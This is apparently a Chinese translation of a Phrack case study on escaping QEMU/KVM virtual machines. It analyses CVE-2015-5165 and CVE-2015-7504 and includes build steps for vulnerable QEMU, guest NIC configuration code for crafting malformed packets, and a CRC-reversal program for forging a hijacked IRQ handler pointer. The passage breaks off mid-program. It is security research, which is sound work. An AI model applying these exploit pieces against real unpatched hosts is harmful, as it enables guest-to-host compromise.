---
layout: post
title:  "VM escape - QEMU Case Study"
date:   2021-3-11
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# VM escape - QEMU Case Study

原文：http://phrack.org/papers/vm-escape-qemu-case-study.html

## Table of contents

```
  1 - Introduction
  2 - KVW/QEMU Overview
      2.1 - Workspace Environment
      2.2 - QEMU Memory Layout
      2.3 - Address Translation
  3 - Memory Leak Exploitation
      3.1 - The Vulnerable Code
      3.2 - Setting up the Card
      3.3 - Exploit
  4 - Heap-based Overflow Exploitation
      4.1 - The Vulnerable Code
      4.2 - Setting up the Card
      4.3 - Reversing CRC
      4.4 - Exploit
  5 - Putting All Together
      5.1 - RIP Control
      5.2 - Interactive Shell
      5.3 - VM-Escape Exploit
      5.4 - Limitations

  6 - Conclusions
  7 - Greets
  8 - References
  9 - Source Code
```



## 1 - Introduction

如今，虚拟机已经大量部署以供个人或企业使用。网络安全供应商使用不同的虚拟机在受限的环境中分析恶意软件。问题自然就出现了：恶意软件可以从虚拟机中逃逸并在主机上执行代码吗？

去年，来自 CrowdStrike 的 Jason Geffner 报告了 QEMU 中的一个严重的漏洞，该漏洞影响虚拟软盘驱动代码，允许攻击者从虚拟机中逃逸到主机 [[1]](http://venom.crowdstrike.com)。这个漏洞在 netsec 社区中获得了很多关注——可能是因为他有一个专用名称（VENOM）——这不是同类中的第一个。

在 2011 年，Nelson Elhage [[2]](media.blackhat.com/bh-us-11/Elhage/BH_US_11_Elhage_Virtunoid_WP.pdf) 报告并成功利用了 QEMU 仿真 PCI 设备热插拔中的漏洞。exp 可以在 [[3]](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c) 获得。

最近，来自数字公司的  Xu Liu 和 Shengping Wang 在 HITB2016 展示在 KVM/QEMU 上的成功利用。他们利用了两个存在于不同网卡（RTL8139 和 PCNET）仿真模型的漏洞（CVE-2015-5165 和 CVE-2015-7504）。在他们的展示中，他们概述了在主机上执行代码的主要步骤，但没有提供任何漏洞利用或技术细节来复现它。

在本文我们提供了 CVE-2015-5165（a memory-leak vulnerability）和 CVE-2015-7504（a heap-based overflow vulnerability）的深度分析，附带好使的 exp。这两个 exp 的结合可以日穿虚拟机（break out from a VM）并在目标主机上执行代码。我们讨论技术细节以便利用 QEMU 网卡设备仿真的漏洞，并提供可能在未来利用 QEMU 漏洞中重用的通用技术。例如，依靠共享内存区域和共享代码的交互式 bindshell。



## 2 - KVM/QEMU Overview

KVM（Kernal-based Virtual Machine）是一个内核模块，可以为用户空间程序提供完整的虚拟化基础架构。它允许一个人运行多个运行未修改的 Linux 或 Windows 镜像的虚拟机。KVM 的用户空间包含在处理硬件仿真的主线 QEMU（Quick Emulator）中。



### 2.1 - Workspace Environment

为了方便使用本文的示例代码，我们在此提供了复现我们开发环境的主要步骤。

由于我们针对的漏洞已经修补，我们需要 checkout QEMU 仓库，转换到修补漏洞之前的 commit ，然后我们配置 QEMU，仅针对目标 x86_64 并启用调试： 

```
$ git clone git://git.qemu-project.org/qemu.git
$ cd qemu
$ git checkout bd80b59
$ mkdir -p bin/debug/native
$ cd bin/debug/native
$ ../../../configure --target-list=x86_64-softmmu --enable-debug \
$                    --disable-werror
$ make
```

在我们的测试环境，我们使用 4.9.2 版的 gcc 构建 QEMU。

对于其他情况，我们假设读者已经有一个可以运行以下命令的 Linux x86_64 镜像：

```
$ ./qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \
$    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \
$    -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \
$    -drive file=<path_to_image>,format=qcow2,if=ide,cache=writeback
```

我们分配 2GB 内存并创建两个网卡：RTL8139 和 PCNET。

我们在运行 x86_64 架构的 3.16 内核的 Debian 7 上运行 QEMU。



### 2.2 - QEMU Memory Layout

为客户机分配的物理内存实际上是 QEMU 虚拟地址中 mmap 专用的区域。注意，分配客户机物理内存时 PROT_EXEC 标志未启用。

下图说明了客户机内存和主机内存如何共存。

```
                        Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++
```

此外，QEMU 为 BIOS 和 ROM 保留了一个内存区域，这些映射在 QEMU 映射文件中可用：

```
7f1824ecf000-7f1828000000 rw-p 00000000 00:00 0
7f1828000000-7f18a8000000 rw-p 00000000 00:00 0         [2 GB of RAM]
7f18a8000000-7f18a8992000 rw-p 00000000 00:00 0
7f18a8992000-7f18ac000000 ---p 00000000 00:00 0
7f18b5016000-7f18b501d000 r-xp 00000000 fd:00 262489    [first shared lib]
7f18b501d000-7f18b521c000 ---p 00007000 fd:00 262489           ...
7f18b521c000-7f18b521d000 r--p 00006000 fd:00 262489           ...
7f18b521d000-7f18b521e000 rw-p 00007000 fd:00 262489           ...

                     ...                                [more shared libs]

7f18bc01c000-7f18bc5f4000 r-xp 00000000 fd:01 30022647  [qemu-system-x86_64]
7f18bc7f3000-7f18bc8c1000 r--p 005d7000 fd:01 30022647         ...
7f18bc8c1000-7f18bc943000 rw-p 006a5000 fd:01 30022647         ...

7f18bd328000-7f18becdd000 rw-p 00000000 00:00 0         [heap]
7ffded947000-7ffded968000 rw-p 00000000 00:00 0         [stack]
7ffded968000-7ffded96a000 r-xp 00000000 00:00 0         [vdso]
7ffded96a000-7ffded96c000 r--p 00000000 00:00 0         [vvar]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
```

虚拟化环境中内存管理的更详细的说明可以在 [[4]](http://lettieri.iet.unipi.it/virtualization/2014/Vtx.pdf) 中找到。



### 2.3 - Address Translation

在 QEMU 中存在两个翻译层：

* 从客户机虚拟地址到客户机物理地址。在我们的利用中，我们需要配置需要 DMA 访问的网卡设备。例如，我们需要提供 Tx/Rx 缓冲区的物理地址以正确配置网卡设备。
* 从客户机物理地址到 QEMU 虚拟地址空间。在我们的利用中，我们需要注入伪造的结构并在 QEMU 虚拟地址空间中获得他们的精确地址。

在 x64 系统，虚拟地址由页偏移（bits 0-11）和页码组成。在 Linux 系统，pagemap 文件启用用户空间程序 CAP_SYS_ADMIN 特权以找出每个虚拟页映射到哪个物理帧上。pagemap 文件为每个虚拟页包含一个 64-bit 值，在 kernel.org [[5]](https://www.kernel.org/doc/Documentation/vm/pagemap.txt) 可以查到：

```
- Bits 0-54  : physical frame number if present.
- Bit  55    : page table entry is soft-dirty.
- Bit  56    : page exclusively mapped.
- Bits 57-60 : zero
- Bit  61    : page is file-page or shared-anon.
- Bit  62    : page is swapped.
- Bit  63    : page is present.
```

要将虚拟地址转换为物理地址，我们依靠 Nelson Elhage 的代码 [[3]](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c) 。下面的程序分配一个缓冲区，用字符串 `Where am I` 填充，并打印它的物理地址：

```c
---[ mmu.c ]---
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int main()
{
    uint8_t *ptr;
    uint64_t ptr_mem;
    
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    
    ptr = malloc(256);
    strcpy(ptr, "Where am I?");
    printf("%s\n", ptr);
    ptr_mem = gva_to_gpa(ptr);
    printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);

    getchar();
    return 0;
}

```

如果我们在客户机运行上面的代码，并用 gdb attach QEMU 进程，我们可以看到我们的缓冲区分配到分配给客户机的物理地址空间中。更准确的说，我们注意到输出的地址实际上是相对客户机物理内存基地址的偏移。

```c
root@debian:~# ./mmu
Where am I?
Your physical address is at 0x78b0d010

(gdb) info proc mappings
process 14791
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x7fc314000000     0x7fc314022000    0x22000        0x0
      0x7fc314022000     0x7fc318000000  0x3fde000        0x0
      0x7fc319dde000     0x7fc31c000000  0x2222000        0x0
      0x7fc31c000000     0x7fc39c000000 0x80000000        0x0
      ...

(gdb) x/s 0x7fc31c000000 + 0x78b0d010
0x7fc394b0d010:    "Where am I?"
```



## 3 - Memory Leak Exploitation

接下来，我们将利用 CVE-2015-5165—— 一个影响 RTL8139 网卡设备仿真器的内存泄露漏洞——为了重现 QEMU 的内存布局。更准确的说，我们需要泄露（一）`.text` 段的基地址，以便构造我们的 shellcode，和（二）分配给客户机的物理内存基地址，以便获得一些注入的虚假结构体的精确地址。

### 3.1 - The vulnerable Code

REALTEK 网卡支持两种接收、发送操作模式：C 模式和 C+ 模式。将网卡设置为使用 C+ 模式时，NIC 设备仿真器错误的计算了 IP 数据包的长度并最终发送了比数据包中实际可用数据更多的数据。

这个漏洞在 `hw/net/rtl8139.c` 的 `rtl8139_cplus_transmit_one ` 函数：

```c
/* ip packet header */
ip_header *ip = NULL;
int hlen = 0;
uint8_t  ip_protocol = 0;
uint16_t ip_data_len = 0;

uint8_t *eth_payload_data = NULL;
size_t   eth_payload_len  = 0;

int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));
if (proto == ETH_P_IP)
{
    DPRINTF("+++ C+ mode has IP packet\n");

    /* not aligned */
    eth_payload_data = saved_buffer + ETH_HLEN;
    eth_payload_len  = saved_size   - ETH_HLEN;

    ip = (ip_header*)eth_payload_data;

    if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) {
        DPRINTF("+++ C+ mode packet has bad IP version %d "
            "expected %d\n", IP_HEADER_VERSION(ip),
            IP_HEADER_VERSION_4);
        ip = NULL;
    } else {
        hlen = IP_HEADER_LENGTH(ip);
        ip_protocol = ip->ip_p;
        ip_data_len = be16_to_cpu(ip->ip_len) - hlen;
	}
}
```

IP 头包含两个字段 `hlen ` 和 `ip->ip_len`，分别代表 IP 头的长度（20字节，考虑不带选项的数据包）和包含 IP 头的数据包的总长度。如下面给出的这段代码末尾所示，计算 IP 数据的长度时（ip_data_len）没有检查保证 `ip->ip_len >= hlen`。`ip_data_len` 字段是 `unsigned short`，这导致发送比传输缓冲区中实际可用数据更多的数据。

更准确的说，`ip_data_len` 后面会用于计算拷贝到一个已分配缓冲区的 TCP 数据的长度（如果数据超过 MTU（最大传输单元）的大小，一块一块的拷贝）:

```c
int tcp_data_len = ip_data_len - tcp_hlen;
int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;

int is_last_frame = 0;

for (tcp_send_offset = 0; tcp_send_offset < tcp_data_len;
    tcp_send_offset += tcp_chunk_size) {
    uint16_t chunk_size = tcp_chunk_size;

    /* check if this is the last frame */
    if (tcp_send_offset + tcp_chunk_size >= tcp_data_len) {
        is_last_frame = 1;
        chunk_size = tcp_data_len - tcp_send_offset;
    }

    memcpy(data_to_checksum, saved_ip_header + 12, 8);

    if (tcp_send_offset) {
        memcpy((uint8_t*)p_tcp_hdr + tcp_hlen,
                (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset,
                chunk_size);
    }

    /* more code follows */
}
```

因此，如果我们伪造一个带有错误长度的畸形包（例如 `ip->ip_len = hlen - 1`），我们可以泄露将近 64KB 的 QEMU 的堆内存。网卡设备仿真器最终将发送 43 个分段包而不是一个单独的包。



### 3.2 - Setting up the Card

为了发送我们的畸形包并读取泄露的数据，我们需要在网卡上配置第一个 Rx 和 Tx 描述符缓冲区，并设置一些标志以便我们的数据包能流经漏洞代码路径。

下图展示了 RTL8139 寄存器，我们不会详述所有的寄存器，除了与我们利用有关的。

```
            +---------------------------+----------------------------+
    0x00    |           MAC0            |            MAR0            |
            +---------------------------+----------------------------+
    0x10    |                       TxStatus0                        |
            +--------------------------------------------------------+
    0x20    |                        TxAddr0                         |
            +-------------------+-------+----------------------------+
    0x30    |        RxBuf      |ChipCmd|                            |
            +-------------+------+------+----------------------------+
    0x40    |   TxConfig  |  RxConfig   |            ...             |
            +-------------+-------------+----------------------------+
            |                                                        |
            |             skipping irrelevant registers              |
            |                                                        |
            +---------------------------+--+------+------------------+
    0xd0    |           ...             |  |TxPoll|      ...         |
            +-------+------+------------+--+------+--+---------------+
    0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |
            +-------+------+------------+------------+---------------+
            
```

* TxConfig：启用/禁用 Tx 标志，例如 TxLoopBack（启用 loopback 测试模式）、TxCRC（不把 CRC 附加到 Tx 数据包后）等。
* RxConfig：启用/禁用 Rx 标志，例如 AcceptBroadcast （接受广播数据包）、AcceptMulticast（接受组播数据包）等。
* CpCmd：C+ 命令寄存器用来启用一些功能例如 CplusRxEnd（启用接收）、CplusTxEnd（启用发送）等。
* TxAddr0：Tx 描述符表的物理内存地址。
* RxRingAddrLO：Rx 描述符表的低 32 位物理内存地址。
* RxRingAddrHI：Rx 描述符表的高 32 位物理内存地址。
* TxPoll：告诉网卡检查 Tx 描述符。

Rx/Tx-descriptor 由下面的结构体定义，其中 `buf_lo ` 和 `buf_hi` 分别是 Tx/Rx 缓冲区的低 32  位和高 32 位物理内存地址。这些地址指向的缓冲区储存将被发送/接收的数据包，并且必须按页面大小对齐。变量 `dw0` 在缓冲区大小上编码额外的标志，例如 ownership 标志表示缓冲区是属于网卡还是属于驱动。

```c
struct rtl8139_desc {
    uint32_t dw0;
    uint32_t dw1;
    uint32_t buf_lo;
    uint32_t buf_hi;
};
```

网卡通过`in*() out*()` 原语（在 `sys/io.h` ）配置。我们需要有 `CAP_SYS_RAWIO` 特权去做这些。下面的代码片段配置网卡并设置一个单一的 Tx 描述符。

```c
#define RTL8139_PORT        0xc000
#define RTL8139_BUFFER_SIZE 1500

struct rtl8139_desc desc;
void *rtl8139_tx_buffer;
uint32_t phy_mem;

rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);

memset(&desc, 0, sizeof(struct rtl8139_desc));

desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
             CP_TX_IPCS | CP_TX_TCPCS;
desc->dw0 += RTL8139_BUFFER_SIZE;

desc.buf_lo = phy_mem;

iopl(3);

outl(TxLoopBack, RTL8139_PORT + TxConfig);
outl(AcceptMyPhys, RTL8139_PORT + RxConfig);

outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);

outl(phy_mem, RTL8139_PORT + TxAddr0);
outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
```



### 3.3 - Exploit

完整的 exp（cve-2015-5165.c）在后面的 source code tarball 中。exp 在网卡上配置所需的寄存器并设置 Tx 和 Rx 缓冲区描述符。然后它伪造一个畸形的 IP 包发送到网卡的 MAC 地址。这允许我们访问配置的 Rx 缓冲区读取泄露的数据。当分析泄露的数据时，我们观察到存在多个函数指针。仔细查看发现这些函数指针都是同一 QEMU 内部结构体中的成员：

```c
typedef struct ObjectProperty
{
    gchar *name;
    gchar *type;
    gchar *description;
    ObjectPropertyAccessor *get;
    ObjectPropertyAccessor *set;
    ObjectPropertyResolve *resolve;
    ObjectPropertyRelease *release;
    void *opaque;

    QTAILQ_ENTRY(ObjectProperty) node;
} ObjectProperty;
```

QEMU 遵循对象模型管理设备，内存区域，等等。在启动时，QEMU 创建多个对象并为其分配属性。例如，下面的调用添加一个 `may-overlap` 属性给内存区域对象。这个属性具有 getter 方法检索这个布尔属性

```c
object_property_add_bool(OBJECT(mr), "may-overlap",
                         memory_region_get_may_overlap,
                         NULL, /* memory_region_set_may_overlap */
                         &error_abort);
```

RTL8139 网卡设备仿真器在堆上有 64KB 用于重组数据包。这个已分配的缓冲区很可能适合析构对象属性得到的空闲空间。

在我们的 exp 中，我们在泄露的内存中搜索已知的对象属性。准确的说，我们搜索 80 字节的内存块（被释放的 ObjectProperty  结构体的块大小），这里至少设置了一个函数指针（get, set, resolve or release）。尽管这些地址服从 ASLR，我们仍然可以猜到 `.text` 节的基地址。实际上，他们的页偏移是固定的（12 个最低有效位或虚拟地址未随机分配）。我们可以做一些运算获得某些有用的 QEMU 函数地址。我们也可以获得某些 LibC 函数地址，例如 PLT 中的 `mprotect()` 和 `system()`。

我们还注意到地址 `PHY_MEM + 0x78` 泄露多次，其中 `PHY_MEM ` 是分配给客户机的物理地址的起始地址。

当前的 exp 搜索泄露的内存并尝试解决（一）`.text` 段的基地址和（二）物理内存的基地址。



## 4 - Heap-based Overflow Exploitation

本节讨论了漏洞 CVE-2015-7504 并提供一个可以控制 %rip 寄存器的 exp。

### 4.1 - The vulnerable Code

AMD PCNET 网卡仿真器在 loopback test mode 模式接收到大数据包时易受到 heap-based overflow 攻击。

PCNET 设备仿真器有一个 4KB 的缓冲区储存数据包。如果 ADDFCS 标志在 Tx 描述符缓冲区上开启，网卡将在接收到的数据包后附上 CRC，如下，`hw/net/pcnet.c` 中的 `pcnet_receive()` 函数代码片段。如果接收到的数据包大小小于 `4096 - 4` 字节，这不会造成问题。然而，如果数据包恰好有 4096 字节，我可以溢出 4 字节到目标缓冲区。

```c
uint8_t *src = s->buffer;

/* ... */

if (!s->looptest) {
    memcpy(src, buf, size);
    /* no need to compute the CRC */
    src[size] = 0;
    src[size + 1] = 0;
    src[size + 2] = 0;
    src[size + 3] = 0;
    size += 4;
} else if (s->looptest == PCNET_LOOPTEST_CRC ||
           !CSR_DXMTFCS(s) || size < MIN_BUF_SIZE+4) {
    uint32_t fcs = ~0;
    uint8_t *p = src;

    while (p != &src[size])
        CRC(fcs, *p++);
    *(uint32_t *)p = htonl(fcs);
    size += 4;
}
```

在上面的代码中，s 指向 PCNET 主结构体，我们可以看到在易受攻击的缓冲区之外，我们可以破坏 irq 变量的值。

```c
struct PCNetState_st {
    NICState *nic;
    NICConf conf;
    QEMUTimer *poll_timer;
    int rap, isr, lnkst;
    uint32_t rdra, tdra;
    uint8_t prom[16];
    uint16_t csr[128];
    uint16_t bcr[32];
    int xmit_pos;
    uint64_t timer;
    MemoryRegion mmio;
    uint8_t buffer[4096];
    qemu_irq irq;
    void (*phys_mem_read)(void *dma_opaque, hwaddr addr,
                          uint8_t *buf, int len, int do_bswap);
    void (*phys_mem_write)(void *dma_opaque, hwaddr addr,
                           uint8_t *buf, int len, int do_bswap);
    void *dma_opaque;
    int tx_busy;
    int looptest;
};
```

变量 irq 是指向 IRQState 结构体的指针，相当于指向一个可执行 handler：

```c
typedef void (*qemu_irq_handler)(void *opaque, int n, int level);

struct IRQState {
    Object parent_obj;
    qemu_irq_handler handler;
    void *opaque;
    int n;
};
```

这个 handler 被 PCNET 网卡仿真器调用多次。例如，在 `pcnet_receive()` 函数的结尾，调用 `pcnet_update_irq()` 函数（原文：is call a to，可能是 is a call to），其中循环调用 qemu_set_irq()：

```c
void qemu_set_irq(qemu_irq irq, int level)
{
    if (!irq)
        return;

    irq->handler(irq->opaque, irq->n, level);
}
```

所以，我们利用这个漏洞需要什么：

* 分配一个带有可执行 handler（例如 `system()`）的伪造的 IRQState 结构体。
* 计算分配的伪造结构体的精确地址。幸好有之前的内存泄露，我们知道伪造的结构体在 QEMU 进程内存中（在客户机物理内存基地址的某个偏移）。
* 精心构造一个 4KB 恶意数据包。
* 修改数据包，使计算得到的 CRC 恰好是我们伪造的 IRQState 地址。
* 发送数据包

当这个数据包被 PCNET 网卡接收，它被 `pcnet_receive()` 函数（原文：pcnet_receive function()，可能是 pcnet_receive() function）处理，执行以下 操作：

* 将接收到的数据包内容复制到缓冲区变量中。
* 计算 CRC 并把它附在缓冲区后，缓冲区有 4 字节溢出，`irq` 变量的值被破坏。
* 调用 `pcnet_update_irq()`，带着被破坏的 `irq` 变量循环调用 `qemu_set_irq()`，接下来执行我们的 handler（原文：Out handler，可能是 Our handler）。

注意我们可以控制被替代的 handler 的前两个参数（`irq->opaque` 和 `irq->n`），但幸好有一个我们后面将会看到的 trick，我们也可以控制第三个参数（`level` 参数 ）。这是调用 `mprotect()` 函数必须的。

还要注意我们用 4 字节破坏了一个 8 字节指针。在我们的测试环境是足够成功控制 %rip 寄存器的。然而在编译时没有 CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志的内核上会出问题，这个问题在 5.4 节讨论。

### 4.2 - Setting up the Card

在进一步研究之前，我们需要配置 PCNET 网卡来配置所需的标志，配置 Tx 和 Rx 描述符缓冲区，分配环形缓冲区储存接收发送的数据包。

AMD PCNET 网卡可以在 16 位模式或 32 位模式进行访问。这依赖于当前 DWI0 的值（值储存在网卡中）。接下来，我们详细介绍 PCNET 网卡在 16 位模式中的主要寄存器，因为这是网卡重置后的默认模式：

```
            0                                  16
            +----------------------------------+
            |              EPROM               |
            +----------------------------------+
            |      RDP - Data reg for CSR      |
            +----------------------------------+
            | RAP - Index reg for CSR and BCR  |
            +----------------------------------+
            |           Reset reg              |
            +----------------------------------+
            |      BDP - Data reg for BCR      |
            +----------------------------------+

```

通过访问 reset 寄存器可以将网卡重置为默认值。

网卡有两类内部寄存器：CSR（控制和状态寄存器）和 BCR（总线控制寄存器）。访问这两个寄存器都需要先在 RAP(寄存器地址端口) 设置我们想要访问的寄存器索引。例如，如果我们想初始化并重启网卡，我们需要把 CSR0 寄存器的 bit0 和 bit1 设为1。我们可以通过向 RAP 寄存器写 0 选择 CSR0 寄存器，然后把 CSR 寄存器设为 0x3：

```c
outw(0x0, PCNET_PORT + RAP);
outw(0x3, PCNET_PORT + RDP);
```

网卡的配置可以通过填充初始化结构并将此结构的物理地址传送给网卡（通过寄存器CSR1和CSR2）来完成。

```c
struct pcnet_config {
    uint16_t  mode;      /* working mode: promiscusous, looptest, etc. */
    uint8_t   rlen;      /* number of rx descriptors in log2 base */
    uint8_t   tlen;      /* number of tx descriptors in log2 base */
    uint8_t   mac[6];    /* mac address */
    uint16_t _reserved;
    uint8_t   ladr[8];   /* logical address filter */
    uint32_t  rx_desc;   /* physical address of rx descriptor buffer */
    uint32_t  tx_desc;   /* physical address of tx descriptor buffer */
};
```



### 4.3 - Reversing CRC

像前面所说的一样，我们需要用数据填充数据包使计算出来的 CRC 恰好是我们伪造的结构体的地址。幸运的是，CRC 是可逆的，幸好有 [[6]](https://blog.affien.com/archives/2005/07/15/reversing-crc/
) 提出的方法，我们只需要在数据包打 4 字节补丁就可以使计算得出的 CRC 恰好是我们选择的任何值。源码 reverse-crc.c，求出一个事先填充缓冲区的 4 字节补丁，使计算得出的 CRC 等于 0xdeadbeef。

```c
---[ reverse-crc.c ]---
#include <stdio.h>
#include <stdint.h>

#define CRC(crc, ch)	 (crc = (crc >> 8) ^ crctab[(crc ^ (ch)) & 0xff])

/* generated using the AUTODIN II polynomial
 *	x^32 + x^26 + x^23 + x^22 + x^16 +
 *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
 */
static const uint32_t crctab[256] = {
	0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,
	0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
	0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
	0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
	0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
	0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
	0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,
	0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
	0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
	0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
	0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,
	0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
	0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,
	0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
	0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
	0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
	0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,
	0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
	0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,
	0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
	0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
	0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
	0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,
	0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
	0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
	0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
	0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
	0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
	0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,
	0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
	0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,
	0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
	0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
	0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
	0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
	0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
	0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,
	0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
	0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
	0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
	0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,
	0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
	0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,
	0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
	0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
	0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
	0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,
	0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
	0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,
	0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
	0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
	0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
	0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,
	0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
	0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
	0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
	0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
	0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
	0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,
	0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
	0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,
	0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
	0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
	0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,
};

uint32_t crc_compute(uint8_t *buffer, size_t size)
{
	uint32_t fcs = ~0;
	uint8_t *p = buffer;

	while (p != &buffer[size])
		CRC(fcs, *p++);

	return fcs;
}

uint32_t crc_reverse(uint32_t current, uint32_t target)
{
	size_t i = 0, j;
	uint8_t *ptr;
	uint32_t workspace[2] = { current, target };
	for (i = 0; i < 2; i++)
		workspace[i] &= (uint32_t)~0;
	ptr = (uint8_t *)(workspace + 1);
	for (i = 0; i < 4; i++) {
		j = 0;
		while(crctab[j] >> 24 != *(ptr + 3 - i)) j++;
		*((uint32_t *)(ptr - i)) ^= crctab[j];
		*(ptr - i - 1) ^= j;
	}
	return *(uint32_t *)(ptr - 4);
}


int main()
{
	uint32_t fcs;
